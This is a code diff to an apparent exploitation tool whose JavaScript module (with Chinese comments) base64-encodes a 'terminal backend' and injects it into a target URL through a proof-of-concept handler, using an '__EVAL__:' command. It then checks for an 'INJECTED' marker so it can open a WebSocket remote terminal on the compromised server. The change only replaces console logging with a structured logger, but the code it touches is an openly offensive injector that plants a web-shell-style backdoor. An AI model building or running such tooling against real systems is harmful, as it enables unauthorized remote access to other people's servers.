@@ -1,6 +1,9 @@
 import { executePOC } from './poc-handler.js'
 import { loadSettings } from './storage-handler.js'
+import { createLogger } from './utils/logger.js'
 import { TERMINAL_INJECT_SUCCESS, TERMINAL_TARGET_NOT_VULNERABLE } from './error-codes.js'
+
+const logger = createLogger('TerminalInjector')
 
 /**
  * 生成要注入的终端后端代码
@@ -31,9 +34,7 @@ export async function injectTerminalBackend(
     const base64Code = Buffer.from(backendCode).toString('base64')
     const command = `__EVAL__:${base64Code}`
 
-    console.log('注入终端后端代码...')
-    console.log('WebSocket 路径:', wsPath)
-    console.log('注入命令长度:', command.length)
+    logger.info('注入终端后端代码', { wsPath, commandLength: command.length })
 
     // 加载设置
     const settingsResult = await loadSettings()
@@ -41,7 +42,7 @@ export async function injectTerminalBackend(
 
     const result = await executePOC(targetUrl, command, settings)
 
-    console.log('POC 执行结果:', {
+    logger.debug('POC 执行结果', {
       is_vulnerable: result.is_vulnerable,
       status_code: result.status_code,
       digest_length: result.digest_content?.length || 0,
@@ -51,26 +52,28 @@ export async function injectTerminalBackend(
 
     // 如果有输出，打印前 500 个字符用于调试
     if (result.digest_content && result.digest_content.length > 0) {
-      console.log('注入输出预览:', result.digest_content.substring(0, 500))
+      logger.debug('注入输出预览', { preview: result.digest_content.substring(0, 500) })
     }
 
     if (result.is_vulnerable) {
       // 等待一下让代码执行
       await new Promise((resolve) => setTimeout(resolve, 1000))
 
+      logger.success('终端后端注入成功', { wsPath })
       return {
         success: true,
         wsPath,
         message: TERMINAL_INJECT_SUCCESS
       }
     } else {
+      logger.warn('目标不可利用', { targetUrl })
       return {
         success: false,
         error: TERMINAL_TARGET_NOT_VULNERABLE
       }
     }
   } catch (error) {
-    console.error('注入终端后端失败:', error)
+    logger.error('注入终端后端失败', error)
     return {
       success: false,
       error: error.message
@@ -96,7 +99,7 @@ export async function testTerminalBackend(targetUrl) {
 
     const result = await executePOC(targetUrl, checkCommand, settings)
 
-    console.log('后端测试结果:', result.digest_content)
+    logger.debug('后端测试结果', { content: result.digest_content })
 
     if (result.is_vulnerable && result.digest_content) {
       return result.digest_content.includes('INJECTED')
@@ -104,7 +107,7 @@ export async function testTerminalBackend(targetUrl) {
 
     return false
   } catch (error) {
-    console.error('测试后端失败:', error)
+    logger.error('测试后端失败', error)
     return false
   }
 }
